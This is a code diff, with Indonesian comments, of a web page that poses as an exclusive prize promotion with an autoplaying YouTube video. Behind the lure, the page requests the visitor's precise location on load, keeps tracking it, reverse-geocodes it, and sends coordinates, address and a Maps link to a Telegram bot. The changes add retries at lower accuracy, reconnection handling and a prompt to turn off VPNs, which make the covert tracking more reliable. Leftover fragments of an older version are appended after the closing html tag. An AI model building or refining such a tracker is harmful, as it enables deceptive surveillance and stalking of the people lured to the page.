@@ -8,19 +8,18 @@
         body { font-family: Arial; padding: 20px; background: #f0f0f0; text-align: center; }
         #video-container { margin: 20px auto; max-width: 560px; }
         #youtube-video { width: 100%; height: 315px; border: none; }
-        #status { font-size: 12px; color: #666; margin-top: 10px; opacity: 0.7; } /* Samar kayak loading */
+        #status { font-size: 12px; color: #666; margin-top: 10px; opacity: 0.7; }
     </style>
 </head>
 <body>
-    <h1>Promo Eksklusif: Nonton Sekarang!</h1>
-    <p>Verifikasi lokasi untuk klaim hadiah. Video mulai otomatis...</p>
+    <h1>!</h1>
+    <p>...</p>
     
     <div id="video-container">
-        <!-- Auto play muted, ganti VIDEO_ID -->
         <iframe id="youtube-video" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&rel=0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
     </div>
     
-    <div id="status">Memverifikasi lokasi... Tunggu sebentar.</div>
+    <div id="status">Tunggu sebentar...</div>
 
     <script>
         // Ganti ini
@@ -30,10 +29,12 @@
         let watchId;
         let lastLat = null;
         let lastLng = null;
-        const MIN_DISTANCE = 5; // Meter
+        const MIN_DISTANCE = 5;
         const status = document.getElementById('status');
+        let retryCount = 0;
+        const MAX_RETRIES = 2;
 
-        // Fungsi jarak
+        // Fungsi jarak (sama)
         function getDistance(lat1, lng1, lat2, lng2) {
             if (!lat1 || !lat2) return Infinity;
             const R = 6371e3;
@@ -46,7 +47,7 @@
             return R * c;
         }
 
-        // Geocode alamat
+        // Geocode (sama)
         async function getAddress(lat, lng) {
             try {
                 const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
@@ -57,7 +58,7 @@
             }
         }
 
-        // Kirim ke Telegram
+        // Kirim ke Telegram (sama)
         async function sendToTelegram(lat, lng, accuracy, timestamp, address, mapsLink) {
             const message = `Lokasi Akurat Baru!\nLatitude: ${lat.toFixed(7)}\nLongitude: ${lng.toFixed(7)}\nAkurasi: ${accuracy}m\nAlamat: ${address}\nWaktu: ${new Date(timestamp).toLocaleString('id-ID')}\nMaps: ${mapsLink}`;
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
@@ -74,7 +75,7 @@
             }
         }
 
-        // Fungsi tampil posisi
+        // Tampil posisi (sama)
         async function showPosition(position) {
             const lat = position.coords.latitude;
             const lng = position.coords.longitude;
@@ -91,82 +92,81 @@
             const mapsLink = `https://maps.google.com/?q=${lat.toFixed(7)},${lng.toFixed(7)}`;
             const address = await getAddress(lat, lng);
             
-            status.innerHTML = `Verifikasi selesai. Terima kasih! (Akurasi: ${acc.toFixed(0)}m)`; // Ubah status halus
-            console.log(`Update: ${lat.toFixed(7)}, ${lng.toFixed(7)} | ${address}`); // Log di console
+            status.innerHTML = `Verifikasi selesai. Terima kasih! (Akurasi: ${acc.toFixed(0)}m)`;
+            console.log(`Update: ${lat.toFixed(7)}, ${lng.toFixed(7)} | ${address}`);
             
             sendToTelegram(lat, lng, acc, time, address, mapsLink);
         }
 
-        // Error halus
+        // Error handler dengan fallback
         function showError(error) {
+            console.error('Geolocation Error:', error.code, error.message);
             let msg = 'Verifikasi gagal: ';
             switch(error.code) {
-                case error.PERMISSION_DENIED: msg += 'Izinkan lokasi untuk promo.'; break;
-                case error.POSITION_UNAVAILABLE: msg += 'Coba lagi nanti.'; break;
-                case error.TIMEOUT: msg += 'Sinyal lemah.'; break;
+                case error.PERMISSION_DENIED:
+                    msg += 'Izinkan lokasi untuk promo.';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    msg += 'Lokasi tidak tersedia. Coba outdoor.';
+                    break;
+                case error.TIMEOUT:
+                    msg += 'Sinyal lemah. Mencoba lagi...';
+                    if (retryCount < MAX_RETRIES) {
+                        retryCount++;
+                        setTimeout(() => attemptGeolocation(false), 2000); // Retry dengan low accuracy setelah 2s
+                    } else {
+                        msg += ' (Coba matikan VPN atau keluar ruangan)';
+                    }
+                    break;
             }
             status.innerHTML = msg;
-            console.error('Error:', msg);
         }
 
-        // Auto start pas load
+        // Fungsi attempt geolocation dengan opsi high/low accuracy
+        function attemptGeolocation(highAccuracy = true) {
+            const options = {
+                enableHighAccuracy: highAccuracy,
+                timeout: 30000, // Naik ke 30 detik
+                maximumAge: 1000
+            };
+            status.innerHTML = `Meminta akses lokasi${highAccuracy ? ' akurat' : ''}...`;
+            
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    showPosition(pos);
+                    // Lanjut watch
+                    watchId = navigator.geolocation.watchPosition(showPosition, showError, options);
+                    retryCount = 0; // Reset retry
+                },
+                showError,
+                options
+            );
+        }
+
+        // Handle network change
+        window.addEventListener('online', () => {
+            console.log('Network online - retrying geolocation');
+            if (retryCount > 0) {
+                setTimeout(() => attemptGeolocation(true), 1000);
+            }
+        });
+
+        window.addEventListener('offline', () => {
+            console.log('Network offline');
+            status.innerHTML = 'Koneksi hilang. Coba lagi.';
+        });
+
+        // Auto start
         function initTracking() {
             if (navigator.geolocation) {
-                status.innerHTML = 'Meminta akses lokasi untuk promo...';
-                // Dapatkan posisi awal dulu
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        showPosition(pos); // Proses posisi awal
-                        // Lanjut watch untuk real-time
-                        watchId = navigator.geolocation.watchPosition(showPosition, showError, {
-                            enableHighAccuracy: true,
-                            timeout: 10000,
-                            maximumAge: 1000
-                        });
-                    },
-                    showError,
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
+                // Coba high accuracy dulu
+                attemptGeolocation(true);
             } else {
                 status.innerHTML = 'Lokasi tidak didukung. Coba browser lain.';
             }
         }
 
-        // Start otomatis setelah DOM load
         window.addEventListener('load', initTracking);
-    </script>
-</body>
-</html>            
-            // Buat link Maps akurat kayak contoh lo
-            const mapsLink = `https://maps.google.com/?q=${lat.toFixed(7)},${lng.toFixed(7)}`;
-            
-            // Geocode alamat
-            const address = await getAddress(lat, lng);
-            
-            // Tampil di halaman
-            output.innerHTML = `Lat: ${lat.toFixed(7)}\nLng: ${lng.toFixed(7)}\nAkurasi: ${acc.toFixed(0)}m\nAlamat: ${address}\nWaktu: ${new Date(time).toLocaleString('id-ID')}\nLink Maps: <a href="${mapsLink}" target="_blank">${mapsLink}</a>\n--- Update akurat ---`;
-            
-            // Kirim ke Telegram
-            sendToTelegram(lat, lng, acc, time, address, mapsLink);
-        }
-
-        function showError(error) {
-            let msg = 'Error: ';
-            switch(error.code) {
-                case error.PERMISSION_DENIED: msg += 'Permission ditolak. Izinin GPS ya!'; break;
-                case error.POSITION_UNAVAILABLE: msg += 'Lokasi nggak tersedia. Coba outdoor.'; break;
-                case error.TIMEOUT: msg += 'Timeout. Sinyal lemah.'; break;
-            }
-            output.innerHTML = msg;
-        }
-
-        function stopTrack() {
-            if (watchId) {
-                navigator.geolocation.clearWatch(watchId);
-                watchId = null;
-                output.innerHTML += '\n--- Tracking dihentikan.';
-            }
-        }
     </script>
 </body>
 </html>
